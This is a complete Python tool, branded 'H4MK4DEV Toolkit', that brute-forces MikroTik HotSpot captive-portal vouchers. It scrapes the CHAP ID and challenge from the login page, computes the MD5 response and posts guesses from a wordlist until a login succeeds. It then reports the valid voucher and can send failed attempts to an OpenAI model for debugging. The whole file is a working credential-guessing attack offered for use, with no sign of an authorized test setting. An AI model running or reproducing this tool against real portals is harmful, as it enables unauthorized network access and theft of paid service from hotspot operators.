#!/usr/bin/env python3
# mikrotik_jsmd5_login.py
# Enhanced version with professional interface and verbose mode

import sys
import os
import re
import requests
import hashlib
import argparse
import signal
import time
from html import unescape
from urllib.parse import urlparse, urljoin
from datetime import datetime

from llm_debug import DEFAULT_ANALYZE_MODEL, OpenAIDebugAnalyzer

class MikroTikLoginTester:
    def __init__(self, timeout=8, verbose=False):
        self.UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
        self.TIMEOUT = timeout
        self.verbose = verbose
        self.session_counter = 0
        self.start_time = datetime.now()
        self.successful_logins = []
        self.failed_logins = []
        self.last_attempt_context = None
        self.should_stop = False
        
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Handle Ctrl+C """
        print(f"\n\n⚠️  Received interrupt signal. Shutting down...")
        self.should_stop = True

    def norm_url(self, u):
        if not u.startswith("http://") and not u.startswith("https://"):
            u = "http://" + u
        p = urlparse(u)
        if p.path in ("", "/"):
            return urljoin(u, "/login")
        return u

    def extract_hidden_input_value(self, page_html, field_name):
        """Extract a hidden input value regardless of attribute order."""
        patterns = [
            rf'<input[^>]*name=["\']{re.escape(field_name)}["\'][^>]*value=["\']([^"\']+)["\']',
            rf'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']{re.escape(field_name)}["\']'
        ]
        for pattern in patterns:
            match = re.search(pattern, page_html, re.IGNORECASE)
            if match:
                return unescape(match.group(1)).strip()
        return None

    def parse_chap_value(self, raw_value, single_byte=False):
        """Parse CHAP values from octal escapes, hex escapes, or plain hex."""
        if raw_value is None:
            return None

        value = raw_value.strip()
        octal_chunks = re.findall(r'\\([0-7]{1,3})', value)
        if octal_chunks:
            parsed = bytes(int(chunk, 8) for chunk in octal_chunks)
            if single_byte:
                return parsed[:1] if parsed else None
            return parsed

        hex_escape_chunks = re.findall(r'\\x([0-9a-fA-F]{2})', value)
        if hex_escape_chunks:
            parsed = bytes.fromhex("".join(hex_escape_chunks))
            if single_byte:
                return parsed[:1] if parsed else None
            return parsed

        normalized = value[2:] if value.lower().startswith("0x") else value
        if re.fullmatch(r'[0-9a-fA-F]+', normalized) and len(normalized) % 2 == 0:
            parsed = bytes.fromhex(normalized)
            if single_byte:
                return parsed[:1] if parsed else None
            return parsed

        if single_byte and normalized.isdigit():
            number = int(normalized)
            if 0 <= number <= 255:
                return bytes([number])

        if single_byte and len(value) == 1:
            return value.encode("latin-1")

        return None

    def extract_hidden_chap_data(self, page_html):
        """Extract CHAP data from hidden MikroTik fields when JavaScript parsing fails."""
        chap_id_value = self.extract_hidden_input_value(page_html, "chap-id")
        challenge_value = self.extract_hidden_input_value(page_html, "chap-challenge")
        if not chap_id_value or not challenge_value:
            return None

        chap_id = self.parse_chap_value(chap_id_value, single_byte=True)
        challenge = self.parse_chap_value(challenge_value)
        if chap_id and challenge:
            return chap_id, challenge
        return None

    def looks_like_login_page(self, resp):
        """Detect whether the final response appears to still be a login page."""
        txt = resp.text.lower()
        final_url = getattr(resp, "url", "").lower()

        login_form_markers = [
            'name="username"',
            "name='username'",
            'name="password"',
            "name='password'",
            "hexmd5(",
            "chap-id",
            "chap-challenge",
            'name="sendin"',
            "name='sendin'"
        ]

        if any(marker in txt for marker in login_form_markers):
            return True

        return "login" in final_url and "logout" not in txt and "status" not in final_url

    def extract_login_data(self, html, base_url):
        """
        Extract login form action and challenge data with multiple fallback methods
        """
        form_patterns = [
            r'<form[^>]*(name=["\']sendin["\']|name=["\']login["\'])[^>]*>',
            r'<form[^>]*id=["\']login["\'][^>]*>',
            r'<form[^>]*class=["\'].*login[^>]*>'
        ]
        
        action = None
        for pattern in form_patterns:
            mform = re.search(pattern, html, re.IGNORECASE)
            if mform:
                tag = mform.group(0)
                ma = re.search(r'action=["\']([^"\']+)["\']', tag, re.IGNORECASE)
                if ma:
                    action = urljoin(base_url, ma.group(1))
                    break
        
        if not action:
            ma2 = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.IGNORECASE)
            if ma2:
                action = urljoin(base_url, ma2.group(1))
        
        md5_patterns = [
            r"hexMD5\(\s*'([^']*)'\s*\+\s*document\.login\.password\.value\s*\+\s*'([^']*)'\)",
            r"hexMD5\(\s*'([^']*)'\s*\+\s*[^\)]+\.password\.value\s*\+\s*'([^']*)'\)",
            r"hexMD5\([^\)]*document\.forms\[[^\]]+\]\.elements\[[^\]]+\][^\)]*\)"
        ]
        
        combined = ""
        for pattern in md5_patterns:
            m = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
            if m:
                prefix = m.group(1) if m.group(1) else ""
                suffix = m.group(2) if len(m.groups()) > 1 else ""
                combined = prefix + suffix
                break
        else:
            m2 = re.search(r"hexMD5\([^)]+\)", html.replace('\n', ' '), re.IGNORECASE)
            if m2:
                combined = m2.group(0)
            else:
                return action, self.extract_hidden_chap_data(html)
        
        octals = re.findall(r'\\([0-7]{1,3})', combined)
        if not octals:
            return action, self.extract_hidden_chap_data(html)
        
        try:
            b = bytes(int(o, 8) for o in octals)
            if len(b) >= 2:
                chap_id = bytes([b[0]])
                challenge = b[1:]
                return action, (chap_id, challenge)
        except ValueError as e:
            if self.verbose:
                print(f"⚠️  Error parsing octals: {e}")
        
        return action, self.extract_hidden_chap_data(html)

    def md5_hex(self, chap_id_bytes, voucher_bytes, challenge_bytes):
        m = hashlib.md5()
        m.update(chap_id_bytes + voucher_bytes + challenge_bytes)
        return m.hexdigest()

    def build_text_preview(self, text, max_chars=1600):
        return OpenAIDebugAnalyzer.shorten_text(text or "", max_chars=max_chars)

    def sanitize_request_payload(self, data):
        sanitized = {}
        for key, value in data.items():
            if key in ("username", "password"):
                sanitized[key] = OpenAIDebugAnalyzer.mask_secret(value)
            else:
                sanitized[key] = value
        return sanitized

    def record_attempt_context(
        self,
        portal,
        voucher,
        login_url,
        post_target,
        auth_method,
        data,
        login_response,
        final_response,
        success_detected,
        chap_id=None,
        challenge=None,
    ):
        self.last_attempt_context = {
            "portal": portal,
            "voucher_masked": OpenAIDebugAnalyzer.mask_secret(voucher),
            "auth_method": auth_method,
            "chap_id_hex": chap_id.hex() if chap_id else "n/a",
            "challenge_length": len(challenge) if challenge else 0,
            "login_url": login_url,
            "login_page_url": getattr(login_response, "url", ""),
            "post_target": post_target,
            "request_payload": self.sanitize_request_payload(data),
            "login_status_code": getattr(login_response, "status_code", "n/a"),
            "final_status_code": getattr(final_response, "status_code", "n/a"),
            "final_url": getattr(final_response, "url", ""),
            "success_detected": success_detected,
            "redirect_chain": [
                {
                    "status_code": item.status_code,
                    "url": getattr(item, "url", ""),
                }
                for item in getattr(final_response, "history", [])
            ],
            "login_page_preview": self.build_text_preview(getattr(login_response, "text", ""), 1800),
            "final_response_preview": self.build_text_preview(getattr(final_response, "text", ""), 2200),
        }

    def is_successful_response(self, resp, voucher):
        """
        Enhanced success detection with multiple indicators
        """
        txt = resp.text.lower()
        final_url = getattr(resp, "url", "").lower()
        success_indicators = [
            "logout", "you are connected", "selamat datang", "welcome",
            "status", "connected", "berhasil", "success",
            "account information", "user info", "remaining time"
        ]
        
        failure_indicators = [
            "invalid", "gagal", "failed", "error", "wrong",
            "tidak valid", "maaf", "sorry", "login again"
        ]

        success_count = sum(1 for indicator in success_indicators if indicator in txt)
        failure_count = sum(1 for indicator in failure_indicators if indicator in txt)
        
        voucher_failure = any([
            f"voucher {voucher}" in txt,
            f"username {voucher}" in txt,
            voucher.lower() in txt and any(fail in txt for fail in failure_indicators)
        ])

        login_page_detected = self.looks_like_login_page(resp)

        if failure_count > 0 or voucher_failure:
            return False

        if final_url and any(marker in final_url for marker in ("/status", "status?", "logout", "welcome")):
            return True

        if resp.history and any(r.status_code in (301, 302, 303, 307, 308) for r in resp.history) and not login_page_detected:
            return True

        if success_count >= 2:
            return True

        if success_count > 0 and not login_page_detected:
            return True
        
        return False

    def print_progress(self, current, total, voucher, status="Testing"):
        """
        Professional progress display
        """
        if total == 0:  
            print(f"\r🔍 Testing: {voucher} - {status}", end="", flush=True)
            return
            
        progress = (current / total) * 100
        bar_length = 30
        filled_length = int(bar_length * current // total)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        
        sys.stdout.write(
            f"\r[{bar}] {progress:.1f}% | {current}/{total} | {status}: {voucher:<15}"
        )
        sys.stdout.flush()

    def validate_inputs(self, portal, wordlist_path=None, single_voucher=None):
        """
        Validate input parameters before testing
        """
        if not re.match(r'^https?://', portal, re.IGNORECASE):
            portal = 'http://' + portal
        
        try:
            response = requests.head(portal, timeout=5, allow_redirects=True, headers={"User-Agent": self.UA})
            if response.status_code >= 400:
                print(f"⚠️  Warning: Portal returned status {response.status_code}")
        except requests.RequestException as e:
            print(f"⚠️  Warning: Cannot reach portal - {e}")
        
        if wordlist_path:
            if not os.path.exists(wordlist_path):
                raise FileNotFoundError(f"Wordlist file not found: {wordlist_path}")
            
            if not os.path.isfile(wordlist_path):
                raise ValueError(f"Path is not a file: {wordlist_path}")
            
            file_size = os.path.getsize(wordlist_path)
            if file_size == 0:
                raise ValueError("Wordlist file is empty")
            
            if file_size > 100 * 1024 * 1024:  
                print("⚠️  Warning: Wordlist file is very large (>100MB)")
        
        return portal

    def print_verbose_request(self, response, request_type="GET"):
        """Print detailed request and response information in verbose mode"""
        if not self.verbose:
            return

        print(f"\n┌─── VERBOSE {request_type} REQUEST ───")
        print(f"├─ URL: {response.request.url}")
        print(f"├─ Method: {response.request.method}")
        print(f"├─ Headers:")
        for key, value in response.request.headers.items():
            print(f"│   {key}: {value}")

        if response.request.body:
            print(f"├─ Body: {response.request.body}")

        print(f"├─── RESPONSE ───")
        print(f"├─ Status Code: {response.status_code}")
        print(f"├─ Headers:")
        for key, value in response.headers.items():
            print(f"│   {key}: {value}")

        response_preview = response.text[:500] + "..." if len(response.text) > 500 else response.text
        print(f"├─ Response Preview: {response_preview}")
        print(f"└─────────────────────────────────────────────\n")

    def test_single_voucher(self, portal, voucher):
        """Test a single voucher"""
        print(f"🎯 Single Voucher Mode")
        print(f"🔑 Testing voucher: {voucher}")
        print(f"🌐 Portal: {portal}")
        print("─" * 70)

        return self._test_voucher_implementation(portal, [voucher], show_progress=False)

    def test_wordlist(self, portal, wordlist_path, delay=0, show_progress=True):
        """Test vouchers from wordlist file"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                vouchers = [line.strip() for line in f.readlines() if line.strip()]
        except Exception as e:
            print(f"❌ Failed to read wordlist: {e}")
            return None

        if not vouchers:
            print("❌ Wordlist is empty.")
            return None

        print(f"📦 Loaded {len(vouchers)} vouchers from {wordlist_path}")
        print(f"🌐 Portal: {portal}")
        if delay > 0:
            print(f"⏰ Delay: {delay} seconds between attempts")
        print("🚀 Starting voucher testing...")
        print("─" * 70)

        return self._test_voucher_implementation(portal, vouchers, delay, show_progress)

    def _test_voucher_implementation(self, portal, vouchers, delay=0, show_progress=True):
        """Internal implementation for testing vouchers"""
        login_url = self.norm_url(portal)
        successful_voucher = None

        for i, voucher in enumerate(vouchers, 1):
            if self.should_stop:
                print("\n⏹️  Testing stopped")
                break

            if show_progress:
                self.print_progress(i, len(vouchers), voucher, "Testing")
            else:
                print(f"\n[{i}/{len(vouchers)}] Testing voucher: {voucher}", end=" ")

            s = requests.Session()
            s.headers.update({"User-Agent": self.UA})
            self.session_counter += 1

            try:
                r = s.get(login_url, timeout=self.TIMEOUT, allow_redirects=True)
                self.print_verbose_request(r, "GET Login Page")
            except Exception as e:
                if show_progress:
                    print(f"\n❌ Failed to get login page: {e}")
                else:
                    print(f"❌ (Failed to get login page: {e})")
                continue

            html = r.text
            action, octal_pair = self.extract_login_data(html, login_url)
            post_target = action or login_url
            chap_id = None
            challenge = None

            if not octal_pair:
                auth_method = "pap"
                if self.verbose:
                    print("ℹ️  Fallback to PAP authentication method")
                data = {"username": voucher, "password": voucher, "dst": "", "popup": "true"}
            else:
                auth_method = "chap-md5"
                chap_id, challenge = octal_pair
                if self.verbose:
                    print(f"🔐 CHAP Auth - ID: {chap_id.hex()}, Challenge: {challenge.hex()}")

                voucher_b = voucher.encode('utf-8')
                resp_hex = self.md5_hex(chap_id, voucher_b, challenge)

                if self.verbose:
                    print(f"🔑 Generated MD5 Hash: {resp_hex}")

                data = {
                    "username": voucher,
                    "password": resp_hex,
                    "dst": "",
                    "popup": "true"
                }

            if self.verbose:
                print(f"📤 POST Target: {post_target}")
                print(f"📝 POST Data: {data}")

            try:
                r2 = s.post(post_target, data=data, timeout=self.TIMEOUT, allow_redirects=True)
                self.print_verbose_request(r2, "POST Login")
            except Exception as e:
                if show_progress:
                    print(f"\n❌ POST failed: {e}")
                else:
                    print(f"❌ (POST failed: {e})")
                continue

            success_detected = self.is_successful_response(r2, voucher)
            self.record_attempt_context(
                portal=portal,
                voucher=voucher,
                login_url=login_url,
                post_target=post_target,
                auth_method=auth_method,
                data=data,
                login_response=r,
                final_response=r2,
                success_detected=success_detected,
                chap_id=chap_id,
                challenge=challenge,
            )

            if success_detected:
                if show_progress:
                    print(f"\n✅ SUCCESS! Valid voucher found: {voucher}")
                else:
                    print(f"✅ SUCCESS!")
                
                successful_voucher = voucher
                self.successful_logins.append(voucher)
                self.print_success_banner(voucher, portal, self.session_counter)
                break
            else:
                if not show_progress:
                    print(f"❌ Failed")
                self.failed_logins.append(voucher)

            if delay > 0 and i < len(vouchers):
                time.sleep(delay)

        return successful_voucher

    def generate_report(self, results, duration, output_file=None):
        """
        Generate comprehensive test report
        """
        report = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                            TEST EXECUTION REPORT                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║    📅 Test Date:    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                                      ║
║    ⏱️  Duration:     {duration:.2f} seconds                                             ║
║    🔄 Sessions:     {self.session_counter}                                                        ║
║    ✅ Successes:    {len(self.successful_logins)}                                                        ║
║    ❌ Failures:     {len(self.failed_logins)}                                                        ║
║                                                                              ║
"""
        
        if self.successful_logins:
            report += f"""║    🎯 Valid Vouchers:                                                        ║
"""
            for voucher in self.successful_logins:
                report += f"║        • {voucher:<60}        ║\n"
        
        report += """║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        
        print(report)
        
        if output_file:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(report)
            print(f"📄 Report saved to: {output_file}")

    def print_banner(self):
        banner = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ███╗   ███╗██╗██╗  ██╗██████╗  ██████╗ ████████╗██╗██╗  ██╗               ║
║    ████╗ ████║██║██║ ██╔╝██╔══██╗██╔═══██╗╚══██╔══╝██║██║ ██╔╝               ║
║    ██╔████╔██║██║█████╔╝ ██████╔╝██║   ██║   ██║   ██║█████╔╝                ║
║    ██║╚██╔╝██║██║██╔═██╗ ██╔══██╗██║   ██║   ██║   ██║██╔═██╗                ║
║    ██║ ╚═╝ ██║██║██║  ██╗██║  ██║╚██████╔╝   ██║   ██║██║  ██╗               ║
║    ╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝╚═╝  ╚═╝               ║
║                                                                              ║
║              VOUCHER LOGIN TESTER - PROFESSIONAL EDITION                     ║
║                                                                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ Started: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}                                                 ║
║ Timeout: {self.TIMEOUT} seconds | Verbose: {'Enabled' if self.verbose else 'Disabled'}                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        print(banner)

    def print_success_banner(self, voucher, portal, session_count):
        success_banner = f"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                            🎉 SUCCESS FOUND! 🎉                              ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║    🔑 Voucher: {voucher:<60}  ║
║    🌐 Portal:  {portal:<60}  ║
║    📊 Sessions: {session_count:<58}   ║
║    ⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<60}     ║
║                                                                              ║
║              Valid voucher discovered and login successful!                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        print(success_banner)

def print_llm_analysis(title, analysis_text):
    print("\n" + "=" * 70)
    print(title)
    print("=" * 70)
    print(analysis_text)


def run_file_analysis(file_path, model):
    analyzer = OpenAIDebugAnalyzer(model=model)
    analysis = analyzer.analyze_file(file_path)
    print_llm_analysis("LLM FILE ANALYSIS", analysis)


def run_attempt_analysis(tester, model):
    if not tester.last_attempt_context:
        print("\n[LLM] No attempt context is available for analysis.")
        return

    analyzer = OpenAIDebugAnalyzer(model=model)
    context_text = OpenAIDebugAnalyzer.format_attempt_context(tester.last_attempt_context)
    analysis = analyzer.analyze_text("last_failed_attempt", context_text)
    print_llm_analysis("LLM DEBUG ANALYSIS", analysis)


def main():
    parser = argparse.ArgumentParser(
        description='MikroTik HotSpot Voucher Login Tester - Professional Edition',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u 192.168.1.1 -w vouchers.txt
  %(prog)s -u https://hotspot.example.com -w wordlist.txt -t 10
  %(prog)s -u 192.168.1.1 -w vouchers.txt -v
  %(prog)s -u 192.168.1.1 --voucher "VOUCHER123" -t 5
  %(prog)s -u 192.168.1.1 -w vouchers.txt -d 0.5 -o report.txt

Features:
  • Multiple authentication method detection
  • Smart success/failure detection
  • Progress tracking and reporting
  • Session management and timeout handling
  • Single voucher testing mode
  • Graceful Ctrl+C handling

Powered by: H4MK4DEV Toolkit
        """
    )

    parser.add_argument('-u', '--url',
                       help='Portal URL or hostname (e.g., 192.168.1.1 or https://portal.com)')
    parser.add_argument('-w', '--wordlist',
                       help='Path to wordlist file for multiple voucher testing')
    parser.add_argument('--voucher',
                       help='Single voucher to test (alternative to wordlist)')
    parser.add_argument('-t', '--timeout', type=int, default=8,
                       help='Timeout in seconds for HTTP requests (default: 8)')
    parser.add_argument('-d', '--delay', type=float, default=0,
                       help='Delay between attempts in seconds (default: 0)')
    parser.add_argument('-o', '--output', 
                       help='Output file to save results')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose mode for detailed output')
    parser.add_argument('--no-progress', action='store_true',
                       help='Disable progress bar display')
    parser.add_argument('--llm-debug', action='store_true',
                       help='Use OpenAI to analyze the last failed login attempt')
    parser.add_argument('--analyze-file',
                       help='Analyze a saved HTML or log file with OpenAI and exit')
    parser.add_argument('--analyze-model', default=DEFAULT_ANALYZE_MODEL,
                       help=f'OpenAI model for analysis (default: {DEFAULT_ANALYZE_MODEL})')

    args = parser.parse_args()

    has_test_input = bool(args.wordlist or args.voucher)

    if not has_test_input and not args.analyze_file:
        parser.error("Provide either --analyze-file or a voucher/wordlist input")
    
    if args.wordlist and args.voucher:
        parser.error("Use either --wordlist or --voucher, not both")

    if has_test_input and not args.url:
        parser.error("--url is required when testing vouchers")

    tester = MikroTikLoginTester(
        timeout=args.timeout, 
        verbose=args.verbose
    )
    
    try:
        tester.print_banner()
        
        if args.analyze_file and not has_test_input:
            run_file_analysis(args.analyze_file, args.analyze_model)
            return
        
        validated_portal = tester.validate_inputs(
            args.url, 
            args.wordlist if args.wordlist else None,
            args.voucher if args.voucher else None
        )
        
        result = None
        
        if args.voucher:
            result = tester.test_single_voucher(validated_portal, args.voucher)
        else:
            result = tester.test_wordlist(
                validated_portal, 
                args.wordlist,
                delay=args.delay,
                show_progress=not args.no_progress
            )
        
        duration = (datetime.now() - tester.start_time).total_seconds()
        tester.generate_report(result, duration, args.output)

        print("\n" + "═" * 70)
        print(f"📈 TEST SUMMARY")
        print("═" * 70)
        print(f"🕒 Duration: {duration:.2f} seconds")
        print(f"🔄 Total sessions: {tester.session_counter}")
        print(f"🎯 Target: {validated_portal}")
        if result:
            print(f"✅ Successful voucher: {result}")
        else:
            print("❌ No valid vouchers found")
        print("═" * 70)
        print("🚀 Powered by: H4MK4DEV Toolkit")

        if not result and args.llm_debug:
            try:
                run_attempt_analysis(tester, args.analyze_model)
            except RuntimeError as llm_error:
                print(f"\n[LLM] {llm_error}")

    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
